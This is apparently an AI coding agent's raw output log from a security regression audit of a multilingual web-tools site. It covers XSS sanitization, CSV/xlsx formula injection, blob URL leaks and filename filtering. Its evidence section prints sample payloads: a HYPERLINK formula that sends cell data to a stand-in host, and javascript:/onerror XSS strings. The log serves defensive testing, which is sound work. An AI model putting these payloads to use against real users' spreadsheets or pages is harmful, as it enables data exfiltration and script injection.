---
title: 輸出安全回歸測試 — 實際執行紀錄
date: 2026-09-07
branch: claude/task-02-funnytools-reliability
---

# 輸出安全回歸測試：實際執行輸出

本檔全部為**實際執行的原始輸出**，未經編修。稽核分析見
`reports/task-02-reliability/output-safety-audit.md`。

環境限制：對外網路封鎖 `funnytools.win` / `api.funnytools.win`（proxy 403），
**沒有做任何線上驗證**。以下結論全部來自原始碼與本機 `npm run build` 產物。

---

## 1. 建置（證據來源）

```
$ npm run build

03:58:34 [build] ✓ Completed in 18.32s.
03:58:34 [build] 1171 page(s) built in 18.63s
03:58:34 [build] Complete!
```

---

## 2. 新測試套件：`node --test tests/output-safety.test.mjs`

```
ok 1 - §1 src/ 完全不使用 outerHTML 與 insertAdjacentHTML
ok 2 - §1 兩個把使用者文字放進 innerHTML 的工具必須保留 esc() 逸出
ok 3 - §1 名單類工具的使用者姓名只走 textContent，不進 innerHTML
ok 4 - §2 MarkdownPreviewer 的預覽必須是 DOMPurify.sanitize(marked.parse(...))
ok 5 - §2 下載的 HTML 檔內容來自已消毒的 preview，不是原始 markdown
ok 6 - §2 marked 本身確實會吐出危險 HTML（證明 DOMPurify 是唯一防線）
ok 7 - §2 安裝版 DOMPurify 的預設 URI 政策擋得住 javascript: 與 data:text/html
ok 8 - §3 工具元件不得出現 javascript: / data:text/html，也不得有動態導頁 sink
ok 9 - §3 每個 anchor.href 指派都只來自本地產生的 blob / canvas dataURL
not ok 10 - §4 [RED] json-to-csv 每個語系的上線頁都必須提供公式逸出防護
ok 11 - §4 papaparse 的 escapeFormulae 確實會逸出 = + - @ 與 tab 開頭（修法有效性佐證）
ok 12 - §4 寫入使用者自由文字的 CSV 工具必須有公式前綴防護
not ok 13 - §4 [RED] backend tables_to_xlsx 必須中和 = 開頭的儲存格
not ok 14 - §5 [RED] ConversionApiTool 的校正圖 object URL 必須被 revoke
ok 15 - §5 除了已消毒的 markdown 匯出，沒有工具產生可被瀏覽器執行的 blob MIME
not ok 16 - §6 [RED] 所有用 file.name 組下載檔名的工具都要過濾檔名
ok 17 - §7 前端絕不採信後端給的 Content-Disposition 檔名
ok 18 - §7 ConversionApiTool 的下載檔名一律是前端常數
ok 19 - §附 build 產物裡每個 ld+json 區塊都必須是合法 JSON
ok 20 - §附 沒有任何內容字串把 </script 帶進 ld+json
# tests 20
# suites 0
# pass 16
# fail 4
# cancelled 0
# skipped 0
# todo 0
# duration_ms 1188.276463
```

**16 綠 / 4 紅。** 四則紅燈是刻意保留的：它們對應四個確認存在的缺口，
本輪只稽核不修 `src/` 與 `backend/`，所以紅燈就是正確結果。

---

## 3. 四則紅燈的完整失敗訊息

```
not ok 10 - §4 [RED] json-to-csv 每個語系的上線頁都必須提供公式逸出防護
  ---
  duration_ms: 4.109564
  type: 'test'
  location: '/home/user/funnytools-win/tests/output-safety.test.mjs:178:1'
  failureType: 'testCodeFailure'
  error: |-
    這些 json-to-csv 頁面沒有公式逸出防護：tools/json-to-csv/index.html, en/tools/json-to-csv/index.html, zh/tools/json-to-csv/index.html
    + actual - expected
    
    + [
    +   'tools/json-to-csv/index.html',
    +   'en/tools/json-to-csv/index.html',
    +   'zh/tools/json-to-csv/index.html'
    + ]
    - []
    
  code: 'ERR_ASSERTION'
  name: 'AssertionError'
  expected:
  actual:
    0: 'tools/json-to-csv/index.html'
    1: 'en/tools/json-to-csv/index.html'
    2: 'zh/tools/json-to-csv/index.html'
  operator: 'deepStrictEqual'
  ...

not ok 13 - §4 [RED] backend tables_to_xlsx 必須中和 = 開頭的儲存格
  ---
  duration_ms: 0.383953
  type: 'test'
  location: '/home/user/funnytools-win/tests/output-safety.test.mjs:215:1'
  failureType: 'testCodeFailure'
  error: 'tables_to_xlsx 沒有任何公式中和步驟：ws.cell(r, c, str(value)) 會讓 "=" 開頭的儲存格 被 openpyxl 標成 data_type="f"，也就是寫成真正的 Excel 公式。'
  code: 'ERR_ASSERTION'
  name: 'AssertionError'
  expected: true
  actual: false
  operator: '=='
  ...

not ok 14 - §5 [RED] ConversionApiTool 的校正圖 object URL 必須被 revoke
  ---
  duration_ms: 0.291382
  type: 'test'
  location: '/home/user/funnytools-win/tests/output-safety.test.mjs:237:1'
  failureType: 'testCodeFailure'
  error: 'ConversionApiTool.astro 有 URL.createObjectURL 卻沒有任何 URL.revokeObjectURL： image-to-dxf 每換一張校正圖就洩漏一份完整影像記憶體。'
  code: 'ERR_ASSERTION'
  name: 'AssertionError'
  expected: true
  actual: false
  operator: '=='
  ...

not ok 16 - §6 [RED] 所有用 file.name 組下載檔名的工具都要過濾檔名
  ---
  duration_ms: 0.93173
  type: 'test'
  location: '/home/user/funnytools-win/tests/output-safety.test.mjs:278:1'
  failureType: 'testCodeFailure'
  error: |-
    這些工具沒有清洗使用者檔名：ImageFormatConverter
    + actual - expected
    
    + [
    +   'ImageFormatConverter'
    + ]
    - []
    
  code: 'ERR_ASSERTION'
  name: 'AssertionError'
  expected:
  actual:
    0: 'ImageFormatConverter'
  operator: 'deepStrictEqual'
  ...
```

---

## 4. 全套件回歸

確認新測試沒有弄壞任何既有測試。

> 註：稽核期間有另一個並行 agent 在同一分支新增了 `tests/a11y-structure.test.mjs`
> （無障礙稽核，非本輪工作）。為了讓「我的測試有沒有弄壞既有測試」這個問題有乾淨答案，
> 下面 A 段刻意排除那個檔案；B 段則是分支當下的全貌。
> A 段的 4 則紅燈全部是本輪的 `[RED]`；B 段多出的 4 則紅燈屬於那個無障礙稽核任務，與本輪無關。

### A) 既有測試 ＋ 本輪新增（排除他人並行新增的 `a11y-structure`）

```
$ ls tests/*.test.mjs | grep -v a11y-structure | xargs node --experimental-strip-types --test
```

```
not ok 39 - §4 [RED] json-to-csv 每個語系的上線頁都必須提供公式逸出防護
not ok 42 - §4 [RED] backend tables_to_xlsx 必須中和 = 開頭的儲存格
not ok 43 - §5 [RED] ConversionApiTool 的校正圖 object URL 必須被 revoke
not ok 45 - §6 [RED] 所有用 file.name 組下載檔名的工具都要過濾檔名
# tests 96
# pass 92
# fail 4
# skipped 0
# todo 0
# duration_ms 1506.542337
```

**96 則測試，92 綠 4 紅——4 則紅燈全部是本輪新增的 `[RED]` 測試，既有的 92 則全綠。**

### B) 分支當下全部測試（含他人並行新增的 `a11y-structure`）

```
$ node --experimental-strip-types --test tests/*.test.mjs
# tests 103
# pass 95
# fail 8
```

103 − 96 = 7 則來自 `tests/a11y-structure.test.mjs`，其中 4 紅是該無障礙任務的發現，不是本輪的。

---

## 5. 支撐紅燈結論的獨立實測

以下是寫進報告的每個「真實可利用」判定所依據的原始執行輸出。

```
### E1. openpyxl 公式強制轉型實測
openpyxl 3.1.5
  input='=1+1'                                               data_type='f' -> FORMULA
  input='=HYPERLINK("http://evil.example/?x="&A1,"click")'   data_type='f' -> FORMULA
  input='+1+1'                                               data_type='s' -> text
  input='-1+1'                                               data_type='s' -> text
  input='@SUM(1)'                                            data_type='s' -> text
  input='\t=1+1'                                             data_type='s' -> text
  input="'=1+1"                                              data_type='s' -> text
  input='plain'                                              data_type='s' -> text

  sheet1.xml 中真的出現 <f> 公式節點：
     r="1"><c r="A1"><f>1+1</f><v /></c></row>
     r="2"><c r="A2"><f>HYPERLINK("http://evil.example/?x="&amp;A1,"click")</f><v /></c></row>

### E2. papaparse escapeFormulae 開/關對照
  escapeFormulae:false -> "name,note\r\n=1+1,@SUM(A1)\r\n+1,-1"
  escapeFormulae:true  -> "name,note\r\n\"'=1+1\",\"'@SUM(A1)\"\r\n\"'+1\",\"'-1\""

### E3. 建置產物中 json-to-csv 各語系是否有 data-escape-formulae
  dist/tools/json-to-csv/index.html                      0
  dist/en/tools/json-to-csv/index.html                   0
  dist/zh/tools/json-to-csv/index.html                   0
  dist/es/herramientas/convertir-json-a-csv/index.html   1
  dist/fr/outils/convertir-json-en-csv/index.html        1

### E4. marked 原始輸出（未消毒）
  <p><a href="javascript:alert(1)">c</a></p>
  <img src=x onerror=alert(1)><p><svg><script>alert(1)</script></svg></p>
  

### E5. 安裝版 DOMPurify 預設 URI 政策
  regexp: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
   false  "javascript:alert(1)"
   false  "JaVaScRiPt:alert(1)"
   false  "vbscript:msgbox(1)"
   false  "data:text/html;base64,PHM+"
   true   "https://ok.example/"
   true   "mailto:a@b.c"
   true   "/relative"
   true   "#frag"
```

### 對上述輸出的說明

- **E1** 直接複製 `backend/services/pdf_table.py:228` 的那一行寫法
  （`ws.cell(r, c, "" if value is None else str(value))`），用 openpyxl 3.1.5 執行。
  `=` 開頭的儲存格 `data_type` 變成 `'f'`，且產出的 `sheet1.xml` 真的含有 `<f>` 節點——
  這就是「被寫成真正的 Excel 公式」的直接證據。
  `+ - @ Tab` 都是 `'s'`（純字串），所以 xlsx 的風險面**只有 `=`**，比 CSV 窄。
  註：openpyxl 是為了這次驗證才 `pip install` 到系統 Python 的，
  **沒有修改 `backend/requirements.txt`，也沒有動任何後端檔案**。
- **E2** 證明 papaparse 的 `escapeFormulae` 是有效修法，並顯示關閉時（＝英/中文頁現況）
  `=1+1`、`@SUM(A1)` 原樣輸出。
- **E3** 是 `npm run build` 產物的直接掃描：英文、中文三個 `json-to-csv` 頁面
  完全沒有 `data-escape-formulae` 這個控制項，只有 es / fr 有。
- **E4** 證明 `marked` 完全不做過濾，因此 `MarkdownPreviewer` 的 DOMPurify 是唯一防線。
- **E5** 從安裝版 `node_modules/dompurify/dist/purify.cjs.js` 抽出實際的預設 URI 政策正則
  並逐一測試，確認 `javascript:`、`vbscript:`、`data:text/html` 都被拒絕。

---

## 6. 因環境限制而**沒有**驗證到的項目

| 項目 | 為什麼沒驗證 |
|------|--------------|
| 任何線上頁面行為 | `funnytools.win` / `api.funnytools.win` 被 proxy 封鎖（403）。**未做線上驗證** |
| `DOMPurify.sanitize()` 實際執行結果 | 本機沒有 jsdom／瀏覽器，且不得新增依賴。§2 結論來自安裝版原始碼與 URI 政策實測，不是 sanitize() 執行結果 |
| 瀏覽器對 `download` 屬性的檔名清洗行為 | 沒有瀏覽器可測。§6 的「實務上不構成路徑穿越」來自規範，非實測 |
| `click()` 後同步 `revokeObjectURL` 是否真的讓下載失敗 | 沒有瀏覽器可測。報告只陳述「與專案自身另外 12 處寫法不一致」這個客觀事實 |
| Excel / Google Sheets 實際開啟產出檔的行為 | 環境無 Office / 無網路。公式注入的判定停在「檔案內容確實是公式」這一層（E1 的 `<f>` 節點） |
| 後端 API 端對端 | `api.funnytools.win` 被封鎖；`tests/conversion-api-integration.api.mjs` 未執行 |
